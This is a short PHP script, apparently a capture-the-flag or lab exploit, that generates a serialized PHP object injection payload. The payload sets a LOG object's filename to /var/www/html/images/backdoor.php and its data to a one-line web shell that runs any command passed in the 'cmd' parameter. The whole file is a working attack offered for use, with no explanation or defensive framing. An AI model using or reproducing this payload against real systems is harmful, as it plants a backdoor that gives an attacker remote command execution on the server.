<?php

/*

Author      : wetw0rk
Description : Generates object injection payload

*/

include "log.php";

$obj = new LOG();
$obj->filename = "/var/www/html/images/backdoor.php";
$obj->data = '<?php system($_GET[\'cmd\']); ?>';

echo serialize($obj)."\n";

?>
